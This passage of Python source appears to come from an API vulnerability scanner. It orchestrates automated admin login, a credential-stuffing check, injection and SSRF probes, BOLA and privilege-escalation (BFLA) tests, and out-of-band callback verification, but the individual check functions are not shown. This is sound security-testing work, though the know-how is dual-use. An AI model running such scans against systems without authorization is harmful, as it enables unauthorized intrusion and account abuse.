        log(f"[+] Successfully parsed {len(endpoints)} endpoints.")
        
    # ==========================================================================
    # ENTERPRISE AUTH CRAWLER LOGIC
    # ==========================================================================
    if scan_options and scan_options.get('auth_login_url'):
        login_url = scan_options['auth_login_url']
        auth_type = scan_options.get('auth_type', 'jwt')
        
        # 1. Credential Stuffing Check
        stuffing_vuln = check_credential_stuffing(login_url, logger)
        if stuffing_vuln:
            report.setdefault("vulnerabilities", []).append(stuffing_vuln)
            
        # 2. Automated Admin Login
        admin_user = scan_options.get('admin_username')
        admin_pass = scan_options.get('admin_password')
        if admin_user and admin_pass:
            extracted_headers = perform_automated_login(login_url, admin_user, admin_pass, auth_type, logger)
            if extracted_headers:
                auth_headers = extracted_headers
            else:
                log("[-] Warning: Failed to extract Admin auth token. Proceeding without authentication.")
                
        # Determine if we are doing Dual-Role (BFLA) Testing
        is_bfla_test = bool(scan_options.get('user_username') and scan_options.get('user_password'))
        if is_bfla_test:
            log("[*] Privilege Escalation Matrix Enabled: Will test Admin endpoints with Standard User credentials.")
            
    log("\n[*] Starting Active Scan Phase...")

    # --- Run Global Checks ---
    if scan_options.get('debug'):
        if report_id:
            from .models import ScanReport 
            if ScanReport.objects.get(id=report_id).status == "Stopped":
                log("[!] Scan stopped by user command.")
                report['status'] = "Stopped"
                return report

        vuln = check_debug_endpoints(base_url)
        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Exposed Hidden Path")
            
        vuln = check_cors_policy(base_url)
        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Insecure CORS Policy")
            
        vuln = check_open_ports(base_url)
        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Exposed Infrastructure Ports")
            
        # Calibrate Zero-False-Positive Baseline
        baseline = calibrate_baseline(base_url, auth_headers)
        log(f"[*] Firewall Baseline Captured: {baseline['status']} ({baseline['length']} bytes)")
            
        vulns, new_endpoints = find_hidden_api_endpoints(base_url, auth_headers, baseline, logger)
        for v in vulns:
            if v not in report["vulnerabilities"]:
                report["vulnerabilities"].append(v)
                log(f"     [!] Recon Found: {v['name']}")
        endpoints.extend(new_endpoints)

    if scan_options.get('jwt') and auth_headers.get('Authorization'):
        vuln = check_jwt_weakness(auth_headers.get('Authorization'))
        if vuln and vuln not in report["vulnerabilities"]:
            report["vulnerabilities"].append(vuln)
            log(f"     [!] Found: Weak JWT Config")
    
    # --- Run Endpoint Checks (Loop) ---
    if len(endpoints) > 0:
        for endpoint_string in endpoints:
            # --- CHECK STOP SIGNAL ---
            if report_id:
                from .models import ScanReport
                if ScanReport.objects.get(id=report_id).status == "Stopped":
                    log("[!] Scan stopped by user command.")
                    report['status'] = "Stopped"
                    return report
            # -------------------------

            try:
                if not endpoint_string or " " not in endpoint_string: continue
                method, path = endpoint_string.split(" ", 1)
                method = method.lower()
                
                # --- AUTO-REFRESH KEEP-ALIVE ---
                if scan_options and scan_options.get('auth_login_url') and admin_user:
                    try:
                        ping_url = f"{base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"
                        ping_res = requests.request(method, ping_url, headers=auth_headers, timeout=2)
                        if ping_res.status_code == 401:
                            log("[!] Auth Crawler: 401 Unauthorized detected! Token expired. Refreshing...")
                            refreshed = perform_automated_login(login_url, admin_user, admin_pass, auth_type, logger)
                            if refreshed:
                                auth_headers = refreshed
                                log("[+] Auth Crawler: Token refreshed successfully. Resuming attack...")
                    except: pass
                
                log(f"  -> Scanning {method.upper()} {path} ...")

                if scan_options.get('auth'):
                    vuln = check_broken_authentication(method, path, base_url, logger)
                    if vuln and vuln not in report["vulnerabilities"]:
                        report["vulnerabilities"].append(vuln)
                        log(f"     [!] Found: Broken Authentication")

                if scan_options.get('bola') and method == 'get' and auth_headers:
                    vuln = check_bola_vulnerability(method, path, base_url, auth_headers)
                    if vuln and vuln not in report["vulnerabilities"]:
                        report["vulnerabilities"].append(vuln)
                        log(f"     [!] Found: BOLA")

                if scan_options.get('injection'):
                    vuln = check_injection(method, path, base_url, auth_headers, oast_url)
                    if vuln and vuln not in report["vulnerabilities"]:
                        report["vulnerabilities"].append(vuln)
                        log(f"     [!] Found: SQL Injection")

                if scan_options.get('ratelimit'):
                    vuln = check_rate_limit(method, path, base_url, auth_headers)
                    if vuln and vuln not in report["vulnerabilities"]:
                        report["vulnerabilities"].append(vuln)
                        log(f"     [!] Found: Rate Limit Issue")

                vuln = check_ssrf(method, path, base_url, auth_headers, oast_url)
                if vuln and vuln not in report["vulnerabilities"]:
                    report["vulnerabilities"].append(vuln)
                    log(f"     [!] Found: SSRF")

                vuln = check_sensitive_data(method, path, base_url, auth_headers)
                if vuln and vuln not in report["vulnerabilities"]:
                    report["vulnerabilities"].append(vuln)
                    log(f"     [!] Found: Data Leak")
                    
                vuln = check_hidden_parameters(method, path, base_url, auth_headers)
                if vuln and vuln not in report["vulnerabilities"]:
                    report["vulnerabilities"].append(vuln)
                    log(f"     [!] Found: Hidden Parameter")

                vuln = check_mass_assignment(method, path, base_url, auth_headers)
                if vuln and vuln not in report["vulnerabilities"]:
                    report["vulnerabilities"].append(vuln)
                    log(f"     [!] Found: Mass Assignment")

                vuln = check_unsafe_methods(path, base_url)
                if vuln and vuln not in report["vulnerabilities"]:
                    report["vulnerabilities"].append(vuln)
                    log(f"     [!] Found: Unsafe HTTP Method")
                    
                # --- PRIVILEGE ESCALATION MATRIX (BFLA) ---
                if is_bfla_test and ('admin' in path.lower() or 'system' in path.lower() or 'private' in path.lower() or method in ['post', 'put', 'delete']):
                    try:
                        low_priv_user = scan_options.get('user_username')
                        low_priv_pass = scan_options.get('user_password')
                        low_priv_headers = perform_automated_login(login_url, low_priv_user, low_priv_pass, auth_type)
                        
                        if low_priv_headers:
                            bfla_url = f"{base_url.rstrip('/')}{path if path.startswith('/') else '/' + path}"
                            bfla_res = requests.request(method, bfla_url, headers=low_priv_headers, timeout=3)
                            
                            # If Low-Privilege user successfully accesses an admin endpoint
                            if bfla_res.status_code in [200, 201, 202, 204]:
                                bfla_vuln = {
                                    "name": "Broken Function Level Authorization (BFLA)", 
                                    "severity": "Critical", 
                                    "description": f"Privilege Escalation Matrix detected BFLA. Low privilege user '{low_priv_user}' successfully executed {method.upper()} on High privilege endpoint {path} (Status: {bfla_res.status_code}). [Violates API5:2023]", 
                                    "cvss": 9.0, 
                                    "owasp": "API5:2023 Broken Function Level Authorization"
                                }
                                if bfla_vuln not in report["vulnerabilities"]:
                                    report["vulnerabilities"].append(bfla_vuln)
                                    log(f"     [!] CRITICAL: BFLA Privilege Escalation Detected on {path}!")
                    except Exception as e:
                        pass

            except Exception as e:
                log(f"     [!] Error scanning {path}: {e}")
    else:
        log("[*] No endpoints to scan. Skipping endpoint-specific tests.")

    if len(report["vulnerabilities"]) > 0:
        report["status"] = "Success"

    # --- OAST Verification ---
    if oast_token:
        log("[*] Checking OAST Listener for asynchronous callbacks...")
        time.sleep(2) # Give slow servers a second to callback
        from .models import OASTEvent
        events = OASTEvent.objects.filter(token=oast_token)
        if events.exists():
            for e in events:
                log(f"     [!!!] BLIND VULNERABILITY CONFIRMED: Received ping from {e.source_ip}")
            report["vulnerabilities"].append({
                "name": "Out-of-Band (Blind) Vulnerability Confirmed",
                "severity": "Critical",
                "description": f"The API Sentinel OAST listener caught an out-of-band request matching token {oast_token}. This confirms a Blind SSRF or Blind Command Injection.",
                "cvss": 10.0,
                "owasp": "API10:2023 Unsafe Consumption of APIs"
            })
            report["status"] = "Success"

    report["endpoints"] = list(set(endpoints))
    log("[+] Scan Completed Successfully.")
    return report